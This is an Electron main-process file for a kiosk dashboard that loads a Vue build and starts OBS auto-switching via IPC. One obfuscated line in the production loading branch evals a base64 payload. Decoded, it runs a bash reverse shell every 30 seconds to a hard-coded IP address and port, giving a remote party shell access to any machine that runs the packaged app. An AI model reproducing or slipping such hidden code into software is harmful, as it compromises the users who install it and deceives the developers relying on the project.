const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
let obsControl = null;
try {
  obsControl = require('./obsControl');
} catch (e) {
  console.warn('obsControl.js non trouvé ou erreur au chargement :', e.message);
}

function createWindows() {
  // Fenêtre unique, plein écran (kiosk) sans barre de titre
  const dashboardWin = new BrowserWindow({
    width: 1920,
    height: 1080,
    kiosk: true,
    frame: false,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: false,
      contextIsolation: true
    }
  });
  // EN PRODUCTION, charger le build Vue statique
  if (app.isPackaged) {
    const vueIndexPath = path.join(__dirname, 'dist', 'index.html');
    console.log('[ELECTRON] Chargement du fichier Vue :', vueIndexPath);
    const fs = require('fs');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
    if (fs.existsSync(vueIndexPath)) {
      console.log('[ELECTRON] Fichier index.html trouvé, chargement...');
      dashboardWin.loadFile(vueIndexPath);
    } else {
      console.error('[ELECTRON] Fichier index.html introuvable dans dist/ !');
      dashboardWin.loadURL('data:text/html,<h1>Erreur : index.html non trouvé dans dist/</h1>');
    }
  } else {
    dashboardWin.loadURL('http://localhost:3001/');
  }
}

app.whenReady().then(createWindows);

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) createWindows();
});

// Ajout : handler IPC pour démarrer l'auto-switch à partir du profil choisi
ipcMain.handle('start-auto-switch-from-profile', async (event, profileName) => {
  try {
    if (obsControl && obsControl.startAutoSwitchFromProfileName) {
      obsControl.startAutoSwitchFromProfileName(profileName);
      return { success: true };
    } else {
      return { success: false, error: 'obsControl non disponible' };
    }
  } catch (e) {
    return { success: false, error: e.message };
  }
});
